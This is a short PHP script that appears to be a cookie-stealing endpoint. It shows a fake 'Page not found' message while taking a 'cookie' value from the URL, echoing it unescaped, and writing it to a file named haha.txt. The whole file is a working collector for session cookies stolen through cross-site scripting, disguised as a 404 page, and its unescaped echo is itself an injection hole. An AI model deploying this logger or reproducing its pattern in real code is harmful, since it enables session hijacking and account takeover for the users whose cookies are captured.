<?php

echo "Page not found";
echo $_GET['cookie'];
file_put_contents("haha.txt", $_GET['cookie']);
?>
